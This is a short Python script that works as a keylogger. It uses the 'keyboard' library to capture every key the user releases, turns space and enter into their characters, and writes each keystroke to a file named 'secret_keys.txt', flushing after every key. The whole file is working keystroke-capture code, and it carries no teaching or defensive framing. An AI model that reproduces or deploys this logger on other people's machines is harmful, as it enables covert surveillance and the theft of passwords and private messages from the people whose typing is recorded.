import keyboard

file = open('secret_keys.txt', 'w')


def new_key(event):
    button = event.name

    if button == "space":
        button = " "
    elif button == "enter":
        button = "\n"

    file.write(button)
    file.flush() # updating the file


keyboard.on_release(callback=new_key)
keyboard.wait()